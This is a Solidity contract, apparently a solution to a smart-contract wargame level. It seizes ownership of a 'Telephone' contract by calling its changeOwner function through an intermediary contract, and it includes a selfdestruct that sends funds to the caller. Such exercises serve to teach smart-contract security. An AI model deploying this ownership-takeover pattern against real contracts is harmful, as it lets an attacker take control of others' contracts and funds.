// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'interfaces/telephoneInterface.sol';

contract TelephoneAttack {
    TelephoneInterface telephone;

    constructor(address _attackerAddress) public{
        telephone = TelephoneInterface(_attackerAddress);
    }

    function exploit() public {
        telephone.changeOwner(msg.sender);
    }

    function destroy() public {
        selfdestruct(msg.sender);
    }
}